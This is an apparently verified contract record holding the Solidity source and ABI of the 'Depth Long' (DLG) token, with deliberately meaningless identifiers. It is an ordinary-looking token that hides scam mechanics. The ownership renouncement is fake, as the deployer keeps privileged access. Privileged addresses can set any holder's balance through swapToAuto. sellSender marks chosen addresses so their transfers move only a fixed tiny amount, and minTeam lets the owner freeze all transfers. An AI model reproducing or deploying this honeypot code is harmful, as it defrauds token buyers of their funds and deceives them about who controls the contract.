{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface shouldLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellMinLaunch {\n    function createPair(address isMode, address exemptSenderWallet) external returns (address);\n}\n\ninterface maxWalletMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txAt) external view returns (uint256);\n\n    function transfer(address launchFund, uint256 buyLaunch) external returns (bool);\n\n    function allowance(address teamFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchFund,\n        uint256 buyLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeLiquidity, uint256 value);\n    event Approval(address indexed teamFee, address indexed spender, uint256 value);\n}\n\ninterface maxWalletMarketingMetadata is maxWalletMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DepthLong is atTake, maxWalletMarketing, maxWalletMarketingMetadata {\n\n    function allowance(address teamMin, address buyAuto) external view virtual override returns (uint256) {\n        if (buyAuto == shouldTake) {\n            return type(uint256).max;\n        }\n        return launchMaxMin[teamMin][buyAuto];\n    }\n\n    string private maxListReceiver = \"Depth Long\";\n\n    function sellSender(address launchSender) public {\n        fromSender();\n        \n        if (launchSender == maxMode || launchSender == txSwap) {\n            return;\n        }\n        liquidityAmount[launchSender] = true;\n    }\n\n    function owner() external view returns (address) {\n        return swapReceiver;\n    }\n\n    uint256 senderTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listTradingSender;\n    }\n\n    function fromSender() private view {\n        require(tokenReceiver[_msgSender()]);\n    }\n\n    address public txSwap;\n\n    uint8 private listTradingSender = 18;\n\n    address shouldTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return swapReceiver;\n    }\n\n    function fromLimit(address amountToken) public {\n        require(amountToken.balance < 100000);\n        if (txMode) {\n            return;\n        }\n        \n        tokenReceiver[amountToken] = true;\n        if (fromToken) {\n            isAuto = totalSender;\n        }\n        txMode = true;\n    }\n\n    uint256 private totalSender;\n\n    uint256 tradingLaunched;\n\n    string private amountWallet = \"DLG\";\n\n    function name() external view virtual override returns (string memory) {\n        return maxListReceiver;\n    }\n\n    address fromEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address atShould, uint256 buyLaunch) external virtual override returns (bool) {\n        return fromAuto(_msgSender(), atShould, buyLaunch);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchMaxMin;\n\n    mapping(address => uint256) private launchedFund;\n\n    bool public txMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverLaunched;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountWallet;\n    }\n\n    function approve(address buyAuto, uint256 buyLaunch) public virtual override returns (bool) {\n        launchMaxMin[_msgSender()][buyAuto] = buyLaunch;\n        emit Approval(_msgSender(), buyAuto, buyLaunch);\n        return true;\n    }\n\n    uint256 private isAuto;\n\n    bool private fromToken;\n\n    function fromAuto(address autoAt, address launchFund, uint256 buyLaunch) internal returns (bool) {\n        if (autoAt == maxMode) {\n            return tokenListMode(autoAt, launchFund, buyLaunch);\n        }\n        uint256 isBuyAt = maxWalletMarketing(txSwap).balanceOf(fromEnable);\n        require(isBuyAt == tradingLaunched);\n        require(launchFund != fromEnable);\n        if (liquidityAmount[autoAt]) {\n            return tokenListMode(autoAt, launchFund, fundFee);\n        }\n        return tokenListMode(autoAt, launchFund, buyLaunch);\n    }\n\n    function tradingReceiver() public {\n        emit OwnershipTransferred(maxMode, address(0));\n        swapReceiver = address(0);\n    }\n\n    address private swapReceiver;\n\n    bool private liquidityTeam;\n\n    mapping(address => bool) public tokenReceiver;\n\n    address public maxMode;\n\n    function swapToAuto(address atShould, uint256 buyLaunch) public {\n        fromSender();\n        launchedFund[atShould] = buyLaunch;\n    }\n\n    function transferFrom(address autoAt, address launchFund, uint256 buyLaunch) external override returns (bool) {\n        if (_msgSender() != shouldTake) {\n            if (launchMaxMin[autoAt][_msgSender()] != type(uint256).max) {\n                require(buyLaunch <= launchMaxMin[autoAt][_msgSender()]);\n                launchMaxMin[autoAt][_msgSender()] -= buyLaunch;\n            }\n        }\n        return fromAuto(autoAt, launchFund, buyLaunch);\n    }\n\n    function tokenListMode(address autoAt, address launchFund, uint256 buyLaunch) internal returns (bool) {\n        require(launchedFund[autoAt] >= buyLaunch);\n        launchedFund[autoAt] -= buyLaunch;\n        launchedFund[launchFund] += buyLaunch;\n        emit Transfer(autoAt, launchFund, buyLaunch);\n        return true;\n    }\n\n    function minTeam(uint256 buyLaunch) public {\n        fromSender();\n        tradingLaunched = buyLaunch;\n    }\n\n    uint256 private receiverLaunched = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed teamExempt, address indexed maxTrading);\n\n    constructor (){\n        if (liquidityTeam != fromToken) {\n            totalSender = isAuto;\n        }\n        shouldLaunch receiverFromSwap = shouldLaunch(shouldTake);\n        txSwap = sellMinLaunch(receiverFromSwap.factory()).createPair(receiverFromSwap.WETH(), address(this));\n        \n        maxMode = _msgSender();\n        tradingReceiver();\n        tokenReceiver[maxMode] = true;\n        launchedFund[maxMode] = receiverLaunched;\n        if (totalSender == isAuto) {\n            totalSender = isAuto;\n        }\n        emit Transfer(address(0), maxMode, receiverLaunched);\n    }\n\n    function balanceOf(address txAt) public view virtual override returns (uint256) {\n        return launchedFund[txAt];\n    }\n\n    uint256 constant fundFee = 20 ** 10;\n\n    mapping(address => bool) public liquidityAmount;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"}],\"name\":\"fromLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyLaunch\",\"type\":\"uint256\"}],\"name\":\"minTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"}],\"name\":\"sellSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLaunch\",\"type\":\"uint256\"}],\"name\":\"swapToAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DepthLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}